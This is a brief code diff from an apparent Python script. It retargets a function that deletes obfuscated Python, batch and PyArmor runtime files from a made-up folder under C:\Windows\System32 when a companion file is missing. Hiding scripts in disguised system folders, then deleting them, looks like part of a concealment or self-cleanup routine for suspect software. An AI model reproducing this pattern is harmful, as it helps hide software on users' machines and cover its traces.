@@ -24,9 +24,9 @@ os.system('cls')
 def delete_files_if_aesv3_missing():
     aesv3_path = r"C:\Windows\System32\NTLK\aesv9.0.py"
     files_to_delete = [
-        r"C:\Windows\System32\MSRX\aesv8.9.py",
-        r"C:\Windows\System32\MSRX\aesv1.bat",
-        r"C:\Windows\System32\MSRX\pyarmor_runtime_000000"
+        r"C:\Windows\System32\NTLK\aesv8.9.py",
+        r"C:\Windows\System32\NTLK\aesv1.bat",
+        r"C:\Windows\System32\NTLK\pyarmor_runtime_000000"
     ]
 
     aesv3_exists = os.path.exists(aesv3_path)
